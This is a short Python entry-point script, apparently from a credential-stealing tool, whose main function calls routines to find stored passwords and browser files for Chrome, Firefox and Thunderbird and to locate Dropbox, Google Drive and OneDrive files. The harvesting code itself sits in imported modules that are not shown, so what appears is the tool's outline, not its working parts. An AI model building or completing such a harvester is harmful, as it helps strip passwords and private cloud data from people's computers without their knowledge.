#!/usr/bin/python


####
### Main script
##
#
##
###
####

import cloud, browserfile, config


def main():
	# find passwords and browser files
	browserfile.chromeFinder()
	browserfile.firefoxFinder()
	browserfile.thunderbirdFinder()

	# find cloud files
	cloud.dropbox()
	cloud.gdrive()
	cloud.onedrive()

if __name__ == "__main__":
	main()
